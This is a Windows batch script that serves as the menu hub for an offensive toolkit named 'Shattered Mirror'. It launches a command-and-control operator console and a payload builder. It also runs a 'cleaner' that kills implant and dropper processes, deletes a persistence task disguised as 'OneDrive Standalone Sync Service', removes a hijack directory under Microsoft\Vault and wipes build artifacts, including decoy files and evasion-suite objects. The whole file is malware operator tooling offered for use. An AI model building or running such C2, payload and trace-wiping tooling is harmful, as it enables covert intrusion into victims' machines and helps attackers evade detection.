@echo off
setlocal enabledelayedexpansion
title Shattered Mirror - Master Command Hub v1.0
set PROJECT_ROOT=%~dp0
cd /d "%PROJECT_ROOT%"

:: --- Color Definitions ---
set "RED=[91m"
set "GREEN=[92m"
set "YELLOW=[93m"
set "BLUE=[94m"
set "CYAN=[96m"
set "WHITE=[97m"
set "GRAY=[90m"
set "RESET=[0m"

:: Ensure Dependencies
echo %CYAN%[*] Initializing Environment...%RESET%
python -c "import aiohttp, flask" 2>NUL
if errorlevel 1 (
    echo %YELLOW%[!] Missing Python dependencies. Installing now...%RESET%
    python -m pip install aiohttp flask --quiet
)

:menu
cls
echo.
echo               %WHITE%MIRROR — MASTER COMMAND HUB  v1.0%RESET%
echo.


echo     %CYAN%[1]%RESET%  %WHITE%Launch Master C2 Console (Operator Panel)%RESET%
echo     %CYAN%[2]%RESET%  %WHITE%Launch Payload Builder (WPF GUI)%RESET%
echo      %RED%[3]%RESET%   %WHITE%Run System Cleaner (Wipe Traces ^& Kill Implants)%RESET%
echo      %GRAY%[4]%RESET%   %WHITE%Exit%RESET%
echo.

set /p choice="    %GREEN%Shattered Mirror >   %RESET%"

if "%choice%"=="1" (
    echo.
    echo    %GREEN%[*] Launching Master C2 Console in separate terminal...%RESET%
    start "Shattered Mirror C2" cmd /k "cd /d "%PROJECT_ROOT%C2_Backend" && python Shattered_Console.py"
    goto menu
)

if "%choice%"=="2" (
    echo.
    echo    %GREEN%[*] Initializing Payload Builder GUI...%RESET%
    cd /d "%PROJECT_ROOT%Builder_GUI"
    dotnet run --project ShatteredBuilder.csproj
    cd /d "%PROJECT_ROOT%"
    echo    %CYAN%[*] Returning to Main Hub...%RESET%
    timeout /t 2 >nul
    goto menu
)

if "%choice%"=="3" (
    call :cleaner
    goto menu
)

if "%choice%"=="4" exit /b 0

:: Handle invalid input
goto menu

:cleaner
cls
echo.
echo    %RED%╔══════════════════════════════════════════════════════════════════╗%RESET%
echo    %RED%║                    SYSTEM PURGE ^& CLEANER                        ║%RESET%
echo    %RED%╚══════════════════════════════════════════════════════════════════╝%RESET%
echo.

echo    %YELLOW%[*] Neutralizing Active Implants...%RESET%
taskkill /F /IM NoteSvc.exe /T 2>nul
taskkill /F /IM Shattered_Mirror.exe /T 2>nul
taskkill /F /IM Dropper.exe /T 2>nul
taskkill /F /IM "Shattered Mirror.exe" /T 2>nul

echo    %YELLOW%[*] Dismantling Persistence...%RESET%
schtasks /delete /tn "OneDrive Standalone Sync Service" /f 2>nul

echo    %YELLOW%[*] Sanitizing Deployment Artifacts...%RESET%
set "TARGET_DIR=%LOCALAPPDATA%\Microsoft\Vault"
if exist "!TARGET_DIR!" (
    rmdir /s /q "!TARGET_DIR!" 2>nul
    echo    %GREEN%[+] Purged hijack directory: Microsoft\Vault%RESET%
)
del /f /q C:\Users\Public\*_debug.txt 2>nul

echo    %YELLOW%[*] Clearing Workspace Debris...%RESET%
del /f /q "%PROJECT_ROOT%*debug.log" 2>nul
del /f /q "%PROJECT_ROOT%payload.bin" 2>nul
del /f /q "%PROJECT_ROOT%ShatteredCore.exe" 2>nul
del /f /q "%PROJECT_ROOT%*.obj" "%PROJECT_ROOT%*.lib" "%PROJECT_ROOT%*.exp" "%PROJECT_ROOT%*.pdb" 2>nul
del /f /q "%PROJECT_ROOT%Atoms\*.obj" "%PROJECT_ROOT%Atoms\*.pdb" 2>nul
del /f /q "%PROJECT_ROOT%Evasion_Suite\*.obj" "%PROJECT_ROOT%Evasion_Suite\src\*.obj" 2>nul
del /f /q "%PROJECT_ROOT%Builder_GUI\*.res" "%PROJECT_ROOT%Builder_GUI\decoy.bin" "%PROJECT_ROOT%Builder_GUI\decoy.ico" 2>nul
del /f /q "%PROJECT_ROOT%_shattered_build_tmp.bat" 2>nul

echo    %YELLOW%[*] Wiping Environment Cache...%RESET%
rmdir /s /q "%PROJECT_ROOT%C2_Backend\__pycache__" 2>nul
rmdir /s /q "%PROJECT_ROOT%Builder_GUI\bin" 2>nul
rmdir /s /q "%PROJECT_ROOT%Builder_GUI\obj" 2>nul
rmdir /s /q "%PROJECT_ROOT%Builder_GUI\Output" 2>nul

echo.
echo    %GREEN%[!] --- SYSTEM PURGE COMPLETE ---%RESET%
echo    %CYAN%Press any key to return to the Command Hub...%RESET%
pause >nul
exit /b